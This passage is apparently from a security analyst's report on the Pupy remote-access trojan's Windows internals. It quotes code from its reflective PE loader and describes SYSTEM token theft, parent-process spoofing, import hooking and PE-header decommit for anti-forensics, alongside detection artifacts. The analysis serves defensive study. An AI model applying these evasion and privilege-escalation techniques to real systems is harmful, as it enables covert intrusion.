**vs Havoc:** Havoc's LSA path needs **no elevation**, usable from an unprivileged foothold. Pupy's token theft **requires `SeDebugPrivilege`**, so it is a *post-*escalation capability — but it delivers far more: an actual SYSTEM token and the ability to spawn a SYSTEM process, which Havoc's LSA call does not. **Havoc reads; Pupy takes.** `[source: §21.3-§21.5; D5]`

**The capability neither has:** `create_new_process_from_ppid` (§21.5) is a **parent-process spoof** — it does not steal a token, it *inherits* one by declaring a SYSTEM parent. Distinct from both Sliver's memory patch and Havoc's LSA call, and it produces a **different forensic signature** (a child process whose recorded parent is `winlogon`/`lsass` and whose token it did not legitimately obtain). `[source: security.py:2692-2761]`

**Position on the axis:** Pupy is the **most complete** of the three at the privilege layer and the **most dependent on prior elevation** — a broad, well-implemented, noisy toolkit, the opposite of Sliver's minimal fail-closed discipline. `[source: §21; inference]`

### 21.9 Detection artifacts from this file

| Artifact | Significance | Source |
|---|---|---|
| Open process token of **`winlogon.exe`** | The `getsystem` primitive; near-zero benign cause | `:1832-1838` |
| `SeDebugPrivilege` enabled by a non-debugger process | Prerequisite for all token theft here | `:1827`, `:1848`, `:1949`, `:2704` |
| `SeImpersonatePrivilege` + `SeAssignPrimaryTokenPrivilege` together | Token duplication for process creation | `:1950`, `:1963-1965` |
| `DuplicateTokenEx` with `TOKEN_ALL_ACCESS` | Over-broad duplication | `:1957-1959` |
| Child process with **spoofed SYSTEM parent** | `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` | `:2727-2729` |
| `UpdateProcThreadAttribute` + `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` | PPID spoof; matches `psgetsys.ps1` signatures | `:2727-2729` |
| Repeated `OpenProcessToken` failures | `exc=False` produces a trail of swallowed attempts | `:1627-1641` |
| `LsaEnumerateLogonSessions` from a non-system process | Unprivileged logon reconnaissance | `:1498`, `:1123-1139` |
| `RtlGetVersion` instead of `GetVersionEx` | Real OS version; defeats version shim | `:1459` |

`[source: security.py as tabulated]`

The **`winlogon` token open** and the **spoofed-parent child** are the two highest-value detections: both are near-unique to this technique family and neither has a common benign explanation. `[source: security.py:1832, :2727-2729; inference]`

### 21.10 U-5 — CLOSED

`security.py` (78,800 B / 2,842 lines) is read to the level the task required: full function inventory, the exact `TOKEN_*`/`Se*` privilege sets with call sites, the complete `getsystem` chain quoted, PPID spoofing confirmed real, the LSASS/SAM question answered negatively and precisely, the stub check answered negatively against the AMSI/ETW comparison, and the Pupy/Havoc/Sliver placement. **U-5 is CLOSED.** `[source: §21.1-§21.9]`

**§14.8 update:** `pupwinutils/security.py` and `client/common/jni_on_load.c` are now **read**. **U-4b** and **U-5** are closed. What remains open: **U-4a** (`MemoryModule.c` and the other native bodies), **U-4c** (`postmortem.c`), and the standing **U-8** (`_pupy_pyd_args_t`). `[source: §14.8, §15, §20.7, §21.10]`

---

## 22. U-4a CLOSED — `MemoryModule.c`, the in-memory PE loader

**Path:** `client/sources-windows-py3/MemoryModule.c` — **51,876 B / 1,641 lines.** The largest native file in Pupy. §1 mapped its export surface only; this section goes inside. **This is the component that makes reflective loading work at all.** `[source: MemoryModule.c — full file measured]`

### 22.1 Load sequence — `MemoryLoadLibraryEx` (`:971-1206`)

The 238-line core, in order:

| Step | Line | Action |
|---|---|---|
| 0 | `:998-1009` | `MEMORY_LOAD_FROM_HMODULE`/`UNHOOK` → map the on-disk file (§22.5); else use the supplied buffer |
| 1 | `:1013-1023` | Validate `IMAGE_DOS_SIGNATURE` and `IMAGE_NT_SIGNATURE` |
| 2 | `:1025-1032` | **Architecture gate** — `AMD64` under `_WIN64`, `I386` otherwise; wrong machine → `ERROR_BAD_EXE_FORMAT` |
| 3 | `:1034-1038` | Reject odd `SectionAlignment` (`& 1`) |
| 4 | `:1040-1061` | Allocate `SizeOfImage` — **preferred-base attempt is `#if DEBUG` only** (§22.6) |
| 5 | `:1065-1073` | Allocate `MEMORYMODULE` bookkeeping struct on the process heap |
| 6 | `:1089-1096` | Commit and copy `SizeOfHeaders`, relocate `result->headers` |
| 7 | `:1099` | **`result->headers->OptionalHeader.ImageBase = (uintptr_t)code`** — rewrite the in-memory image base |
| 8 | `:1102` | `CopySections` |
| 9 | `:1107-1112` | Relocations (§22.2) |
| 10 | `:1115` | `BuildResourceTables` |
| 11 | `:1121` | `BuildImportTable` (§22.3) |
| 12 | `:1128` | `FinalizeSections` — page protections per section characteristics |
| 13 | `:1133-1137` | `ExecuteTLS` (§22.4) — **before the entry point** |
| 14 | `:1139-1146` | `RegisterExceptionTable` — **`_WIN64` only** |
| 15 | `:1150` | `BuildExportTable` |
| 16 | `:1153-1174` | Call `DllMain(DLL_PROCESS_ATTACH)` if it is a DLL and has an EP |
| 17 | `:1178-1183` | **`CleanupHeaders` — `#ifndef DEBUG`, i.e. release only** (§22.6) |

`[source: MemoryModule.c:971-1206]`

**Step 7 is the crux of the whole technique.** `:1099` overwrites the loaded image's own `ImageBase` field with the address it actually landed at. Everything downstream — relocation arithmetic, `AddressOfCallBacks` in TLS, exception-table registration — reads that rewritten value, so the in-memory PE is *self-consistent at its real address* while the file on disk is untouched. `[source: MemoryModule.c:1099]`

**The error path is clean** (`:1194-1205`): `MemoryFreeLibrary(result)` then unmap/close the mapping, and the `cleanup:` label (`:1185-1192`) handles the non-error exits. Both paths unmap `pvViewOfFile` and close `hMapping`, so §22.5's mapping does not leak. `[source: MemoryModule.c:1185-1205]`

### 22.2 Relocations — `PerformBaseRelocation` (`:368-424`)

Textbook and correct:

```c
// MemoryModule.c:390-417
// the upper 4 bits define the type of relocation
type = *relInfo >> 12;
// the lower 12 bits define the offset
offset = *relInfo & 0xfff;

switch (type)
{
case IMAGE_REL_BASED_ABSOLUTE:
    // skip relocation
    break;

case IMAGE_REL_BASED_HIGHLOW:
    // change complete 32 bit address
    patchAddrHL = (DWORD *) (dest + offset);
    *patchAddrHL += (DWORD) delta;
    break;

#ifdef _WIN64
case IMAGE_REL_BASED_DIR64:
    patchAddr64 = (ULONGLONG *) (dest + offset);
    *patchAddr64 += (ULONGLONG) delta;
    break;
#endif

default:
    //printf("Unknown relocation: %d\n", type);
    break;
}
```
`[source: MemoryModule.c:390-417]`

- `ABSOLUTE` (type 0) skipped correctly, `HIGHLOW` (3) for 32-bit, `DIR64` (10) under `_WIN64`.
- **`default:` silently ignores unknown relocation types** (`:414-416`) — and the diagnostic `printf` is **commented out**. An unrecognised relocation is a **silent no-op**, not a failure. Since relocation types that do not apply to the current architecture *should* be skipped, blanket-ignoring is defensible — but it also means a genuinely malformed or unsupported type produces no signal at all. `[source: MemoryModule.c:414-416]`
- The early return at `:374-376` — `return (delta == 0)` when there is no relocation directory — is **technically wrong**: a module with no relocations loaded at a non-zero delta should report failure, and this returns `FALSE`. Given §22.6 makes `delta != 0` the norm, a no-relocation module would fail to load. In practice PE DLLs that must relocate always carry a relocation directory, so it does not bite in this codebase. `[source: MemoryModule.c:374-376; inference]`

### 22.3 Import resolution — `BuildImportTable` (`:520-695`), and the hook tables

**The single most significant finding in this file.** Imports are resolved through a **hook table keyed by module name and symbol name**, so the loaded module receives *Pupy's* implementations instead of the real APIs:

```c
// MemoryModule.c:529-556 (abridged)
ImportHooks kernel32Hooks[] = {
    {"LoadLibraryA",   (FARPROC) module->callbacks->loadLibraryA},
    {"LoadLibraryW",   (FARPROC) module->callbacks->loadLibraryW},
    {"LoadLibraryExA", (FARPROC) module->callbacks->loadLibraryExA},
    {"LoadLibraryExW", (FARPROC) module->callbacks->loadLibraryExW},
    {"GetModuleHandleA",   ...getModuleHandleA},
    {"GetModuleHandleW",   ...getModuleHandleW},
    {"GetModuleHandleExA", ...getModuleHandleExA},
    {"GetModuleHandleExW", ...getModuleHandleExW},
    {"GetModuleFileNameA", ...getModuleFileNameA},
    {"GetModuleFileNameW", ...getModuleFileNameW},

    {"GetVersionExA", (FARPROC) GetVersionExA_Hooked},
    {"GetVersionExW", (FARPROC) GetVersionExW_Hooked},

    {"FindResourceA",   ...getFindResourceA},
    {"FindResourceW",   ...getFindResourceW},
    {"FindResourceExA", ...getFindResourceExA},
    {"FindResourceExW", ...getFindResourceExW},
    {"SizeofResource",  ...getSizeofResource},
    {"LoadResource",    ...getLoadResource},

    {"CreateThread", (FARPROC) module->callbacks->createThread},

    {"GetProcAddress", (FARPROC) module->callbacks->getProcAddress},
    {"FreeLibrary",    (FARPROC) module->callbacks->freeLibrary},
    {NULL, NULL}
};
```
`[source: MemoryModule.c:529-556]`

Every module loaded through this loader that imports any of those 21 symbols gets redirected:

| Hooked symbol(s) | Redirected to | Why it matters |
|---|---|---|
| `LoadLibrary*` (×4) | Pupy's callbacks | **The loaded module's own dependency loading is intercepted** — it can only load through Pupy's loader |
| `GetModuleHandle*` (×4) | Pupy's callbacks | Module handle queries answered by the loader |
| `GetModuleFileName*` (×2) | Pupy's callbacks | **A reflective module cannot learn its own path from the real API** |
| `GetVersionExA/W` (×2) | `GetVersionExA_Hooked`/`W_Hooked` | Real OS version via local `RtlGetVersion` (§22.3.1) |
| `FindResource*`/`SizeofResource`/`LoadResource` (×6) | Pupy's callbacks | Resources come from the in-memory module, not disk |
| `CreateThread` | Pupy's callback | Thread creation routed through the implant |
| `GetProcAddress`/`FreeLibrary` | Pupy's callbacks | Late binding routed through the implant |

`[source: MemoryModule.c:529-556]`

**This is a policy of total import mediation.** A reflective module loaded by Pupy does not talk to the Windows loader for any of these; it talks to Pupy. The practical consequence for analysis: **a capability that appears to call `LoadLibraryA` or `GetModuleHandleA` may in fact be calling Pupy's wrapper**, so the analyst must read the callback implementations, not assume the documented Win32 semantics. `[source: MemoryModule.c:529-556; inference]`

**Resolution loop** (`:591-692`): walks `IMAGE_IMPORT_DESCRIPTOR` until `importDesc->Name` is null, guards each descriptor with `IsBadReadPtr` (`:593`), loads each DLL via `module->callbacks->loadLibraryA` (`:608`), and appends the handle to a `realloc`'d `module->modules` array (`:618-628`). Failure to load a DLL → `ERROR_MOD_NOT_FOUND` and abort (`:612-616`). `[source: MemoryModule.c:591-628]`

**The thunk walk** (`:649-683`) uses the hint table when present and falls back to `FirstThunk` when not (`:630-640`):

```c
// MemoryModule.c:652-677
if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) {
    *funcRef = module->callbacks->getProcAddress(
        handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef)
    );
} else {
    PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME) (codeBase + (*thunkRef));
    *funcRef = GetImportAddr(
        hooks, module->callbacks->getProcAddress,
        handle, (LPCSTR)&thunkData->Name
    );
}
```
`[source: MemoryModule.c:652-677]`

**Note the asymmetry:** ordinal imports (`:652-658`) go **straight to `getProcAddress` and bypass `GetImportAddr` entirely** — so **hook substitution does not apply to by-ordinal imports.** A module importing purely by ordinal receives the real Windows API and none of Pupy's hooks. This is a significant functional asymmetry and a clean detection/evasion observation: the hook policy is **name-keyed, therefore ordinal-blind.** `[source: MemoryModule.c:652-677]`

`GetImportAddr` (`:426-447`) does `strcmp` over the hook list and falls back to `getProcAddress` when no hook matches — so hooks are **overrides, not an allowlist**; unmatched imports pass through unchanged. Any unresolved symbol sets `result = FALSE` (`:679-682`) and aborts the load with `ERROR_PROC_NOT_FOUND` (`:687-691`). `[source: MemoryModule.c:426-447, :679-691]`

#### 22.3.1 `RtlGetVersion` — the local reimplementation (`:61-73`)

```c
// MemoryModule.c:61-73
static NTSTATUS WINAPI RtlGetVersion(OSVERSIONINFOEXW *infow) {
    static t_RtlGetVersion _RtlGetVersion = NULL;
    if (!_RtlGetVersion) {
        HMODULE ntdll = GetModuleHandle("NTDLL");
        _RtlGetVersion = (t_RtlGetVersion) GetProcAddress(ntdll, "RtlGetVersion");
    }
    if (!_RtlGetVersion)
        return E_UNEXPECTED;
    return _RtlGetVersion(infow);
}
```
`[source: MemoryModule.c:61-73]`

Lazily resolves the real `ntdll!RtlGetVersion` into a function-static (thread-unsafe on first call, but benign). Paired with `GetVersionExA_Hooked`/`GetVersionExW_Hooked` at `:541-542`, this means **a reflected module calling `GetVersionEx` gets the truthful OS version, bypassing the compatibility shim** — the same trick `security.py:1459` uses. The loader deliberately hands loaded modules a version API they cannot be lied to by. `[source: MemoryModule.c:61-73, :541-542; §21.2]`

**The `_PUPY_PRIVATE_WS2_32` ETW block (`:558-574`) is DEAD IN EVERY BUILD** — see §22.7. `[source: MemoryModule.c:558-574, :578-581; Makefile]`

### 22.4 TLS callbacks — `ExecuteTLS` (`:340-365`)

```c
// MemoryModule.c:346-363
PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_TLS);
if (directory->VirtualAddress == 0) {
    dprint("No TLS callbacks..\n");
    return TRUE;
}

dprint("Execute TLS..\n");

tls = (PIMAGE_TLS_DIRECTORY) (codeBase + directory->VirtualAddress);
callback = (PIMAGE_TLS_CALLBACK *) tls->AddressOfCallBacks;
if (callback) {
    while (*callback) {
        dprint("Call TLS Callback %p\n", callback);
        (*callback)((LPVOID) codeBase, DLL_PROCESS_ATTACH, NULL);
        callback++;
    }
}
```
`[source: MemoryModule.c:346-363]`

Three points:

1. **`AddressOfCallBacks` is dereferenced as an absolute VA, not an RVA** (`:356`). This is correct in-memory (`tls` is already `codeBase + RVA`, and `AddressOfCallBacks` is a relocated absolute pointer) — and it works **because relocations already ran at `:1109`, before `:1134`.** Order dependency is real and the loader respects it. `[source: MemoryModule.c:355-356, :1109, :1134]`
2. **TLS callbacks run BEFORE the entry point** (`:1133` precedes `:1153`) — matching Windows semantics, and the comment at `:1132` says so explicitly. `[source: MemoryModule.c:1132-1137]`
3. **`MEMORY_LOAD_NO_TLS_CALLBACKS` suppresses the whole pass** (`:1133`). No exception guard around the calls — a throwing TLS callback propagates. `[source: MemoryModule.c:1133-1137]`

**This is the injection primitive that matters for evasion analysis:** a payload can place its execution logic in a **TLS callback** rather than `DllMain`. Windows runs TLS callbacks before the entry point, and so does this loader, so a TLS-callback-resident payload executes on load **without the entry point ever being called**. Combined with `MEMORY_LOAD_NO_EP` (`:1153`), a module can be loaded with TLS callbacks firing and no entry point at all. `[source: MemoryModule.c:340-365, :1133, :1153; inference]`

### 22.5 `_CreateModuleMapping` (`:906-967`) — the UNHOOK path

```c
// MemoryModule.c:919-962 (abridged)
hFile = CreateFileA(szDllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
...
hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
...
pvMem = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
```
`[source: MemoryModule.c:919-962]`

Triggered by `MEMORY_LOAD_FROM_HMODULE | MEMORY_LOAD_UNHOOK` (`:998`). It takes an **already-loaded** module handle, resolves its on-disk path via `GetModuleFileNameA`, and maps **the original file read-only**. Purpose: load a **pristine copy from disk** rather than the in-memory (and possibly hooked or hooked-over) image — the "unhook" operation. `[source: MemoryModule.c:906-967, :998-1006]`

`PAGE_READONLY` (`:937`) and `FILE_MAP_READ` (`:952`) are correct for a read-only source. The mapping is released by the caller's `cleanup`/`error` paths (`:1186-1190`, `:1199-1203`). `[source: MemoryModule.c:937, :952, :1186-1203]`

### 22.6 Two `#if DEBUG` build-config splits — release and debug builds behave differently

**Confirmed against the Makefile:** `DEBUG` reaches the compiler **only** via `ifdef DEBUG` → `/DDEBUG /DVERBOSE` (`Makefile:44-46`). Release builds define none of it. `[source: sources-windows-py3/Makefile:44-46]`

| Line | Guard | Effect |
|---|---|---|
| `:1040-1048` | **`#if DEBUG`** | The attempt to allocate at the image's declared `ImageBase` exists **only in debug builds** |
| `:1178-1183` | **`#ifndef DEBUG`** | `CleanupHeaders` runs **only in release builds** |

`[source: MemoryModule.c:1040-1048, :1178-1183]`

**Consequence of the first:** in a release build `code` is still `NULL` at `:1050`, so execution **always** takes the arbitrary-position allocation (`:1052`). The image therefore **never lands at its declared `ImageBase`**, so `locationDelta` at `:1107` is always non-zero, so **`PerformBaseRelocation` always runs** and the `else` branch at `:1110-1112` is effectively dead. The preferred-base optimization is forfeited in shipped builds — a small performance cost, and the reason relocation handling must be correct. `[source: MemoryModule.c:1040-1112; Makefile:44-46; inference]`

**Consequence of the second, and it is the anti-forensics step.** `CleanupHeaders` (`:891-904`):

```c
// MemoryModule.c:891-904
VOID CleanupHeaders(PMEMORYMODULE module) {
    PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(
        module, IMAGE_DIRECTORY_ENTRY_EXPORT);

    dprint("Cleaning PE headers at %p, size %d\n",
        module->headers, SizeOfPEHeader(module->headers));

    if (!VirtualFree(module->headers, SizeOfPEHeader(module->headers),
        MEM_DECOMMIT)) {
            dprint("Cleaning PE Header failed: %d\n", GetLastError());
        }
}
```
`[source: MemoryModule.c:891-904]`

It decommits **exactly the PE header region**, sized precisely by `SizeOfPEHeader` (`:884-889`):

```c
// MemoryModule.c:884-889
DWORD SizeOfPEHeader(IMAGE_NT_HEADERS *headers) {
    return offsetof(IMAGE_NT_HEADERS, OptionalHeader) +
        headers->FileHeader.SizeOfOptionalHeader +
        (headers->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
}
```
`[source: MemoryModule.c:884-889]`

**So in a release build, the PE headers of every in-memory-loaded module are decommitted after load.** An analyst scanning process memory for `MZ`/`PE\0\0` signatures across committed regions will **not** find the header of a module loaded this way — the pages are gone, not merely modified. This is the concrete anti-forensics payoff of the reflective loader and it is the highest-value detection-relevant fact in the file. Note `MEM_DECOMMIT` (not `MEM_RELEASE`) and `VirtualFree` on a sub-region of a larger committed allocation — legitimate, and it leaves the allocation reserved. `[source: MemoryModule.c:891-904; inference]`

Two minor defects: `directory` is assigned at `:892-893` and **never used** (dead local); and the `VirtualFree` failure branch only prints under `dprint`, so a header-cleanup failure is silent in release. `[source: MemoryModule.c:892-904]`

### 22.7 A FOURTH shipped-broken feature — the ETW suppression is dead in every build

`BuildImportTable` contains an ETW-stub block guarded by a macro:

```c
// MemoryModule.c:558-574 (abridged)
#ifdef _PUPY_PRIVATE_WS2_32
    ImportHooks ntdllHooks[] = {
        {"EtwEventRegister",   (FARPROC) module->callbacks->systemEtwRegister},
        {"EtwEventWrite",      (FARPROC) module->callbacks->systemEtwEventWrite},
        {"EtwEventWriteFull",  (FARPROC) module->callbacks->systemEtwEventWriteFull},
        {"EtwEventUnregister", (FARPROC) module->callbacks->systemEtwUnregister},
        {NULL, NULL}
    };

    ImportHooks advapi32Hooks[] = {
        {"EventRegister",   (FARPROC) module->callbacks->systemEtwRegister},
        {"EventWrite",      (FARPROC) module->callbacks->systemEtwEventWrite},
        {"EventWriteFull",  (FARPROC) module->callbacks->systemEtwEventWriteFull},
        {"EventUnregister", (FARPROC) module->callbacks->systemEtwUnregister},
        {NULL, NULL}
    };
#endif
```
`[source: MemoryModule.c:558-574]`

…and registered into the hook table only under the same guard:

```c
// MemoryModule.c:576-583
DllHooks dllHooks[] = {
    { "KERNEL32.DLL", kernel32Hooks },
#ifdef _PUPY_PRIVATE_WS2_32
    { "ADVAPI32.DLL", advapi32Hooks },
    { "NTDLL.DLL", ntdllHooks },
#endif
    {NULL, NULL}
};
```
`[source: MemoryModule.c:576-583]`

**`_PUPY_PRIVATE_WS2_32` is defined nowhere.** Verified two ways: a recursive scan of every file in `sources-windows-py3/` finds the token **only** in `#ifdef`/`#ifndef` directives (`MemoryModule.c:558`, `:578`; `MemoryModule.h:76`, `:144`; `MyLoadLibrary.c:198`, `:275`; `pupy_load.c:238`, `:285`) — **never in a `#define` or a `/D` flag**; and the Makefile's complete define list is `_WIN32`, `WIN_X64`/`_WIN64` or `WIN_X86`, `LIBCRYPTO`, `LIBSSL`, `LIBFFI`, `HAVE_WINDOW`, `_PUPY_DYNLOAD`, `_PUPY_PRIVATE_NT`, `POSTMORTEM`, `UNCOMPRESSED` (plus `DEBUG`/`VERBOSE` in debug builds only). **`_PUPY_PRIVATE_WS2_32` is not among them.** `[source: recursive grep; sources-windows-py3/Makefile:16-117]`

**Therefore: the ETW hook tables are never compiled, `ADVAPI32.DLL`/`NTDLL.DLL` never enter `dllHooks`, and ETW suppression for reflected modules does not exist in any shipped build.** The eight `#ifdef` sites across four files are all inert. `[source: MemoryModule.c:558-583; Makefile; grep]`

**This is the fourth shipped-broken feature, and it is the subtlest one yet** — a different defect class again:

| # | Feature | Severed at | Tombstone |
|---|---|---|---|
| 1 | Windows persistence (§17) | missing file | none |
| 2 | JVM module (§18) | commented out, ×3 levels | `"NOT IMPLEMENTED: broken jvm setup"` |
| 3 | Android payload (§20) | placeholder file | `"pp.py is not replaced with working one!"` |
| 4 | **ETW suppression (§22.7)** | **preprocessor — the `-D` is absent** | **none — the absence IS the tombstone** |

`[sources: §17, §18, §20.3, §22.7]`

**And the trap is a near-miss:** `_PUPY_PRIVATE_NT` **is** defined (`Makefile:87` — `CFLAGS += /D_PUPY_DYNLOAD /D_PUPY_PRIVATE_NT`), and `_PUPY_PRIVATE_WS2_32` sits one line away in the source and shares the `_PUPY_PRIVATE_` prefix. An analyst reading the source sees an ETW-bypass capability clearly written; **only checking the build flags reveals it is not compiled.** This is the same error class as assuming `assert` survives `-OO` (§14.5) or that a header declaration implies a live symbol (§18.6) — **source presence is not build presence.** `[source: Makefile:87; §14.5, §18.6]`

### 22.8 Compression of the U-4a findings

| Question asked by task-16 | Answer | Line |
|---|---|---|
| Relocations | `PerformBaseRelocation`, `ABSOLUTE`/`HIGHLOW`/`DIR64`, unknown types **silently ignored** | `:368-424` |
| Import resolution | Hook-table mediation (`kernel32Hooks`, 21 symbols); **ordinal imports bypass hooks** | `:520-695`, `:652-658` |
| TLS callbacks | `ExecuteTLS` runs callbacks with `DLL_PROCESS_ATTACH` **before the EP**; suppressible | `:340-365` |
| `isAllowedSymbol` policy | Three modes: exact / FNV-1a / prefix; ordinals always allowed; no filter ⇒ allow all; **unknown mode ⇒ deny** | `:749-812` |

`[source: MemoryModule.c as cited]`

### 22.9 `isAllowedSymbol` — the export-filter policy (`:749-812`)

```c
// MemoryModule.c:749-812 (abridged)
static
BOOL isAllowedSymbol(LPCSTR procname, PVOID pvExportFilter, MEMORY_LOAD_FLAGS flags) {
    size_t proclen;

    if (HIWORD(procname) == 0) {
        return TRUE;
    }

    if (!pvExportFilter) {
        return TRUE;
    }

    proclen = strlen(procname);

    switch (flags & (MEMORY_LOAD_EXPORT_FILTER_FNV1A | MEMORY_LOAD_EXPORT_FILTER_PREFIX)) {
        case MEMORY_LOAD_DEFAULT: {
            const PSTR *pIter;
            for (pIter=pvExportFilter; pIter && *pIter; pIter++) {
                LPCSTR pSymbol = *pIter;
                if (!strcmp(pSymbol, procname)) {
                    dprint("Allow import %s - by symbol\n", procname);
                    return TRUE;
                }
            }
        }
        break;

        case MEMORY_LOAD_EXPORT_FILTER_FNV1A: {
            DWORD dwProcHash = fnv1a((const unsigned char *) procname, proclen);
            PDWORD pIter;
            for (pIter=pvExportFilter; pIter && *pIter; pIter++) {
                if (*pIter == dwProcHash) {
                    dprint("Allow import %s - by fnv1a (%08x)\n", procname, dwProcHash);
                    return TRUE;
                }
            }
        }
        break;

        case MEMORY_LOAD_EXPORT_FILTER_PREFIX: {
            const PSTR *pIter;
            for (pIter=pvExportFilter; pIter && *pIter; pIter++) {
                LPCSTR pPrefix = *pIter;
                size_t len = strlen(pPrefix);
                if (len > proclen)
                    continue;
                if (!strncmp(pPrefix, procname, len)) {
                    dprint("Allow import %s - prefix '%s' (%d)\n", procname, pPrefix, len);
                    return TRUE;
                }
            }
        }
        break;

        default:
            dprint("Invalid flags %08x\n", flags);
    }

    dprint("Deny import: %s\n", procname);
    return FALSE;
}
```
`[source: MemoryModule.c:749-812]`

**What exactly is blocked, and why:**

1. **Two unconditional allows.** `HIWORD(procname) == 0` (`:752`) — this is the `IS_INTRESOURCE` test, so **ordinal imports are always allowed**; there is no name to filter. `!pvExportFilter` (`:756`) — **no filter supplied means allow everything**, i.e. filtering is opt-in. `[source: MemoryModule.c:752-758]`
2. **Exact mode (`MEMORY_LOAD_DEFAULT`)** — `strcmp` against a NULL-terminated array of permitted names. The filter list is plaintext.
3. **FNV-1a mode (`MEMORY_LOAD_EXPORT_FILTER_FNV1A`)** — the candidate name is hashed with `fnv1a` (`:738-746`) and compared to a `DWORD` array. **This is the anti-analysis variant: the allowlist contains no readable symbol names**, so an analyst reading the loader's data cannot enumerate which exports a payload expects. It mirrors the hash-by-name resolution in `ReflectiveLoader.c` (§1.5) — the hash discipline is consistent across the loader family. `[source: MemoryModule.c:738-746, :775-785]`
4. **Prefix mode (`MEMORY_LOAD_EXPORT_FILTER_PREFIX`)** — `strncmp` on a prefix, with a `len > proclen` guard (`:794-795`) so a longer prefix cannot spuriously match. Used to permit a whole name family (e.g. all of `Py*`) without listing each. `[source: MemoryModule.c:788-803]`
5. **Unknown flag combination ⇒ DENY.** The `default:` case (`:806-807`) prints `"Invalid flags"` and **falls through to `return FALSE`** (`:811`). An unrecognised filter mode is **fail-closed** — it denies rather than permits. `[source: MemoryModule.c:806-811]`

**The policy in one sentence:** the export filter is an **opt-in allowlist** (no filter ⇒ everything allowed) with **three selection modes** (plaintext exact, hashed exact, prefix), **ordinals unconditionally exempt**, and **fail-closed on an unrecognised mode**. `[source: MemoryModule.c:749-812]`

`fnv1a` (`:738-746`) is standard FNV-1a 32-bit — offset basis `2166136261`, prime `16777619`, no finalisation step. `[source: MemoryModule.c:738-746]`

### 22.10 U-4a — CLOSED

`MemoryModule.c` (51,876 B / 1,641 lines) is read to the level the task required: the complete load sequence, relocations, import resolution **including the hook tables**, TLS callbacks, the `UNHOOK` mapping path, both `#if DEBUG` splits with Makefile confirmation, the `CleanupHeaders` anti-forensics step, and the `isAllowedSymbol` policy in full. **U-4a is CLOSED.**

**Four findings that change the corpus picture:**

1. **Header decommit is release-only** (`:1178`) — in-memory modules loaded by a shipped Pupy have **no PE headers in memory**. Highest-value detection-relevant fact here. `[source: §22.6]`
2. **Import mediation is total but ordinal-blind** (§22.3) — 21 hookable `kernel32` symbols; by-ordinal imports bypass the hooks entirely.
3. **TLS callbacks are a first-class load-time execution path** (§22.4) — run before the EP, and usable with `MEMORY_LOAD_NO_EP`.
4. **A FOURTH shipped-broken feature: ETW suppression is not compiled** (§22.7) — `_PUPY_PRIVATE_WS2_32` is defined nowhere; eight `#ifdef` sites across four files are inert. **Source presence is not build presence.**

**§14.8 update:** `MemoryModule.c` is now **read**. U-4a, U-4b, U-5 are closed. Still open: **U-4c** (`postmortem.c`), and the remaining native bodies listed in §14.8 (`MyLoadLibrary.c`, `thread.c`, `LoadLibraryR.c`, `in-mem-exe.c`, `GetProcAddressR.c`, `remote_thread.c`, `actctx.c`, `resource_python_manifest.c`, Windows `main_exe.c`, `sources-linux-py3/`). **U-8** (`_pupy_pyd_args_t`) remains open. `[source: §14.8, §20.7, §21.10, §22.10]`

---

## 23. U-4c CLOSED — `postmortem.c`, the crash-artefact generator, and a FIFTH severed feature

**Path:** `client/sources-windows-py3/postmortem.c` — **25,642 B / 898 lines.** Read in full. The task's pointer was exact: this file **is** the crash-dump/self-inspection path, and it **does** turn out to be severed at the build layer — **a fifth shipped-broken feature, by a third distinct build-layer mechanism.** `[source: postmortem.c — full file measured]`

### 23.1 What it is — and the name is misleading

`Postmortem` (`:816-876`) is installed as an **unhandled-exception filter** around the Pupy worker thread, and on a fatal exception it writes a **comprehensive process forensic dump** to disk:

```
%LOCALAPPDATA%\Microsoft\postmortem\      (POSTMORTEM_DEST_FOLDER, postmortem.h:7)
```
`[source: postmortem.h:6-7; postmortem.c:849-851]`

**Artefacts written by `SaveExceptionInfo` (`:860`, body to `:814`):**

| Artefact | Line | Content |
|---|---|---|
| Exception record | `:726-763` | Code, human name (`code2str`, `:24-56`), flags, address |
| **Full register context** | `:735-762` | RSP/RBP/RIP + RAX–R15 (`_WIN64`) or ESP/EBP/EIP + EAX–EDI (32-bit) |
| **Loaded-module list** | `:781`, `:784` | `MyEnumerateLibraries` + `MyEnumerateLoadedLibraries` |
| **DBGHELP stack trace** | `:791` | `SaveContextStack` via `DBGHELP.DLL` |
| Calling stack | `:802` | `SaveCallingStack` |
| **Full CPython stack** | `:808` | `Py_GetCurrentThreadStackTrace` → `SavePythonStackTrace` |

`[source: postmortem.c:726-814]`

**This is not a crash reporter. It is an on-host forensic evidence generator** — registers, module inventory, native call stack, and the **entire Python stack of the failing thread**, written to a directory whose name (`Microsoft\postmortem`) reads as a vendor component. An analyst recovering this file gets the implant's native execution context **and its Python-level call stack**, which is precisely the information a reverse engineer would otherwise have to reconstruct by hand. **It is the single most analyst-useful artefact Pupy can leave on disk, and Pupy writes it for itself.** `[source: postmortem.c:816-876; inference]`

`code2str` (`:24-56`) maps 20 `EXCEPTION_*` codes to names via the `ECODE` macro (`:14`) with a linear scan and `"UNKNOWN"` fallback — cosmetic, used only for the log line at `:826-831`. `[source: postmortem.c:14, :24-56]`

### 23.2 The FIFTH severed feature — the minidump is `#ifdef DEBUG` only

```c
// postmortem.c:859-872
dprint("Generating crash context info..\n");
SaveExceptionInfo(hDbgHelp, appdata_local, pExceptionPointers);
dprint("Crash context saved\n");

#ifdef DEBUG
  if (pExceptionPointers) {
    if (hDbgHelp) {
      dprint("Generating minidump...\n");
      CreateMiniDump(hDbgHelp, appdata_local, pExceptionPointers);
    } else {
      dprint("Failed to load DBGHELP\n");
    }
  }
#endif
```
`[source: postmortem.c:859-872]`

**The minidump — the most valuable single artefact this facility can produce — is generated only in `DEBUG` builds.** In a release build `SaveExceptionInfo` still runs, but `CreateMiniDump` is not compiled. `[source: postmortem.c:863-872; Makefile:44-46]`

